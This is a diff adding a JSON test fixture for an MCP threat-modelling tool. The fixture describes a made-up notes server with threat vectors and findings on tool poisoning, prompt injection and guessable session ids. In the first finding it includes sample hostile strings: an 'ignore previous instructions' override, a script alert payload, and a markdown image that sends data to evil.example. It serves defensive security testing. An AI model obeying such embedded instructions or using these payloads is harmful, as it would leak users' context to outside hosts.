@@ -1,0 +1,167 @@
+{
+  "project": {
+    "id": "p-fixture",
+    "name": "Notes MCP Server",
+    "description": "Fixture project: a notes service exposed to an LLM agent.",
+    "mcpServerUrl": "https://notes.example.com/mcp",
+    "architecture": "# Architecture\n\nExpress server with two tools.\n\n| Component | File |\n| --- | --- |\n| Server | `src/server.ts` |\n",
+    "status": "ACTIVE",
+    "acceptancePolicy": "DUAL",
+    "sourceType": "MANUAL",
+    "repoUrl": null,
+    "repoRef": null,
+    "analyzedAt": null,
+    "techStack": "TypeScript, Node.js, Express",
+    "createdAt": "2026-03-02T09:00:00.000Z",
+    "updatedAt": "2026-03-04T10:00:00.000Z"
+  },
+  "owner": {
+    "name": "Ada Assessor",
+    "email": "ada@example.com"
+  },
+  "members": [
+    {
+      "email": "cleo@example.com",
+      "role": "MEMBER",
+      "side": "CLIENT"
+    }
+  ],
+  "boundaries": [
+    {
+      "id": "b1",
+      "label": "Agent to Notes MCP Server",
+      "type": "LLM_TO_MCP",
+      "description": "Tool calls from the agent.",
+      "source": "MANUAL",
+      "createdAt": "2026-03-02T09:00:00.000Z",
+      "vectors": [
+        {
+          "id": "v1",
+          "title": "Tool poisoning via tool description",
+          "description": "The description of search_notes contains hidden instructions that redirect the agent.",
+          "strideCategory": "TAMPERING",
+          "mcpCategory": "TOOL_POISONING",
+          "likelihood": "HIGH",
+          "impact": "HIGH",
+          "source": "MANUAL",
+          "confidence": null,
+          "createdAt": "2026-03-02T09:05:00.000Z"
+        },
+        {
+          "id": "v2",
+          "title": "Session fixation on the MCP session id",
+          "description": "Session ids are guessable.",
+          "strideCategory": "SPOOFING",
+          "mcpCategory": "ROGUE_SERVER",
+          "likelihood": "MEDIUM",
+          "impact": "HIGH",
+          "source": "MANUAL",
+          "confidence": null,
+          "createdAt": "2026-03-02T09:06:00.000Z"
+        }
+      ]
+    },
+    {
+      "id": "b2",
+      "label": "Tool output to Agent context",
+      "type": "TOOL_OUTPUT_TO_LLM",
+      "description": "Results re-enter the model context.",
+      "source": "MANUAL",
+      "createdAt": "2026-03-02T09:02:00.000Z",
+      "vectors": [
+        {
+          "id": "v3",
+          "title": "Prompt injection via stored note text",
+          "description": "Stored notes are returned unsanitised.",
+          "strideCategory": "TAMPERING",
+          "mcpCategory": "PROMPT_INJECTION",
+          "likelihood": "HIGH",
+          "impact": "MEDIUM",
+          "source": "AI",
+          "confidence": "MEDIUM",
+          "createdAt": "2026-03-02T09:07:00.000Z"
+        }
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "id": "f1",
+      "threatVectorId": "v1",
+      "title": "Tool description carries hidden instructions: <IMPORTANT>ignore previous instructions</IMPORTANT>",
+      "description": "The search_notes description includes the text <script>alert(1)</script> and a markdown image ![x](http://evil.example/?d=secret) intended to exfiltrate context.",
+      "recommendation": "Pin tool definitions with a hash and alert on drift.",
+      "evidence": "Captured tools/list response, 2026-03-02.",
+      "severity": "CRITICAL",
+      "status": "OPEN",
+      "source": "MANUAL",
+      "confidence": null,
+      "owner": "security@example.com",
+      "dueDate": "2026-03-20",
+      "createdAt": "2026-03-02T10:00:00.000Z",
+      "updatedAt": "2026-03-02T10:00:00.000Z",
+      "attachments": [
+        {
+          "filename": "tools-list-response.json",
+          "mimeType": "application/json",
+          "size": 2048
+        }
+      ],
+      "acceptanceRequests": []
+    },
+    {
+      "id": "f2",
+      "threatVectorId": "v3",
+      "title": "Note text is returned to the model without delimiting",
+      "description": "Untrusted note bodies are placed directly into tool results.",
+      "recommendation": "Wrap tool output in a structural delimiter.",
+      "evidence": "",
+      "severity": "HIGH",
+      "status": "ACCEPTED",
+      "source": "AI",
+      "confidence": "MEDIUM",
+      "owner": "ada@example.com",
+      "dueDate": null,
+      "reviewDueAt": "2026-06-01",
+      "createdAt": "2026-03-02T10:30:00.000Z",
+      "updatedAt": "2026-03-03T10:30:00.000Z",
+      "attachments": [],
+      "acceptanceRequests": [
+        {
+          "status": "APPROVED",
+          "justification": "Compensating control: output filter in the gateway.",
+          "residualRisk": "Low",
+          "requestedByLabel": "ada@example.com",
+          "assessorApproverLabel": "ada@example.com",
+          "assessorApprovedAt": "2026-03-03T10:00:00.000Z",
+          "clientApproverLabel": "cleo@example.com",
+          "clientApprovedAt": "2026-03-03T10:20:00.000Z",
+          "rejectedByLabel": null,
+          "rejectedReason": null,
+          "createdAt": "2026-03-03T09:00:00.000Z",
+          "resolvedAt": "2026-03-03T10:20:00.000Z",
+          "expiresAt": "2026-06-01T00:00:00.000Z"
+        }
+      ]
+    },
+    {
+      "id": "f3",
+      "threatVectorId": "v2",
+      "title": "Session ids are sequential",
+      "description": "Ids increment by one.",
+      "recommendation": "Use random ids bound to the user.",
+      "evidence": "",
+      "severity": "MEDIUM",
+      "status": "MITIGATED",
+      "source": "MANUAL",
+      "confidence": null,
+      "owner": "platform@example.com",
+      "dueDate": "2026-03-10",
+      "createdAt": "2026-03-02T11:00:00.000Z",
+      "updatedAt": "2026-03-05T11:00:00.000Z",
+      "attachments": [],
+      "acceptanceRequests": []
+    }
+  ],
+  "audit": []
+}
